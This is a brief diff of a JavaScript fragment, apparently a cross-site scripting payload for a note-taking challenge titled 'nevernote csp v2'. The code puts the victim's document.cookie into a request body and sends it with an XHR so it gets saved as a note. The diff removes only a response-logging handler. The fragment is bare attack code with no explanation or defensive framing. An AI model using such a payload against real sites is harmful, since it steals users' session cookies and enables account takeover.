@@ -6,10 +6,4 @@ const body = JSON.stringify({
   title: 'nevernote csp v2', content: document.cookie, submit: 'save'
 });
 
-xhr.onload = function() {
-  if (xhr.readyState === 4) {
-    console.log("Response:", xhr.responseText);
-  }
-};
-
 xhr.send(body);
